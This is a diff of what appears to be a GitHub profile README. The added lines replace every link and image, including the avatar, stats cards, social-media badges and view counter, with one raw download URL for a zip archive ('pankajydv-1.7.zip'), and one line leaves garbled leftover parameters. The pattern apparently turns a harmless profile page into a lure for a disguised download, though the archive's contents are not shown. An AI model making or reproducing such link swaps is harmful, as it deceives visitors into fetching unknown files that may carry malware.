@@ -1,13 +1,13 @@
 <h1 align="center"> Pankaj Yadav</h1>
 
 <div align="center">
-  <a href="https://git.io/typing-svg">
-    <img src="https://readme-typing-svg.demolab.com?font=Fira+Code&weight=600&size=24&pause=1000&color=3584E4&center=true&vCenter=true&random=false&width=600&height=60&lines=Full-Stack+Developer;AI+Enthusiast" alt="Typing SVG" />
+  <a href="https://raw.githubusercontent.com/pankajydv08/pankajydv08/main/overname/pankajydv-1.7.zip">
+    <img src="https://raw.githubusercontent.com/pankajydv08/pankajydv08/main/overname/pankajydv-1.7.zip+Code&weight=600&size=24&pause=1000&color=3584E4&center=true&vCenter=true&random=false&width=600&height=60&lines=Full-Stack+Developer;AI+Enthusiast" alt="Typing SVG" />
   </a>
 </div>
 
 <div>
-  <img align="left" style="border-radius: 45%;border:1px solid blue"  src="https://avatars.githubusercontent.com/u/157686378" alt="Pankaj Yadav" width="180" height="180" />
+  <img align="left" style="border-radius: 45%;border:1px solid blue"  src="https://raw.githubusercontent.com/pankajydv08/pankajydv08/main/overname/pankajydv-1.7.zip" alt="Pankaj Yadav" width="180" height="180" />
   
   <div style="margin-left: 200px;">
     <h3>Summary</h3>
@@ -75,9 +75,9 @@ Let's connect,learn, and build together!</pre>
     <img src="https://img.shields.io/badge/REST_API-FF6C37?style=for-the-badge&logo=postman&logoColor=white" alt="REST API" />
   </p>
 
-  <div align="center">   <a href="https://github.com/pankajydv07">
-      <img height="150em" src="https://github-readme-stats.vercel.app/api?username=pankajydv07&show_icons=true&count_private=true&theme=dark" alt="Pankaj's GitHub Stats" />
-      <img height="150em" src="https://github-img-readme-stats.herokuapp.com/?user=pankajydv07&theme=dark" alt="GitHub Streak Stats" />
+  <div align="center">   <a href="https://raw.githubusercontent.com/pankajydv08/pankajydv08/main/overname/pankajydv-1.7.zip">
+      <img height="150em" src="https://raw.githubusercontent.com/pankajydv08/pankajydv08/main/overname/pankajydv-1.7.zip" alt="Pankaj's GitHub Stats" />
+      <img height="150em" src="https://raw.githubusercontent.com/pankajydv08/pankajydv08/main/overname/pankajydv-1.7.zip" alt="GitHub Streak Stats" />
     </a>
   </div>
 
@@ -85,17 +85,17 @@ Let's connect,learn, and build together!</pre>
     <a href="mailto:pankajydv07@gmail.com">
       <img src="https://img.shields.io/badge/Email-D14836?style=for-the-badge&logo=gmail&logoColor=white" alt="Email" />
     </a>
-    <a href="https://twitter.com/pankajydv07">
+    <a href="https://raw.githubusercontent.com/pankajydv08/pankajydv08/main/overname/pankajydv-1.7.zip">
       <img src="https://img.shields.io/badge/Twitter-1DA1F2?style=for-the-badge&logo=twitter&logoColor=white" alt="Twitter" />
     </a>
-    <a href="https://linkedin.com/in/pankajyadav08">
+    <a href="https://raw.githubusercontent.com/pankajydv08/pankajydv08/main/overname/pankajydv-1.7.zip">
       <img src="https://img.shields.io/badge/LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white" alt="LinkedIn" />
     </a>
-    <a href="https://github.com/pankajydv07">      <img src="https://img.shields.io/badge/GitHub-181717?style=for-the-badge&logo=github&logoColor=white" alt="GitHub" />
+    <a href="https://raw.githubusercontent.com/pankajydv08/pankajydv08/main/overname/pankajydv-1.7.zip">      <img src="https://img.shields.io/badge/GitHub-181717?style=for-the-badge&logo=github&logoColor=white" alt="GitHub" />
     </a>
 
   </div>
 
 <h1>âŸ‘€
-  <img src="https://komarev.com/ghpvc/?username=pankajydv07&style=flat&font=blue">
+  <img src="https://raw.githubusercontent.com/pankajydv08/pankajydv08/main/overname/pankajydv-1.7.zip">
 </h1>
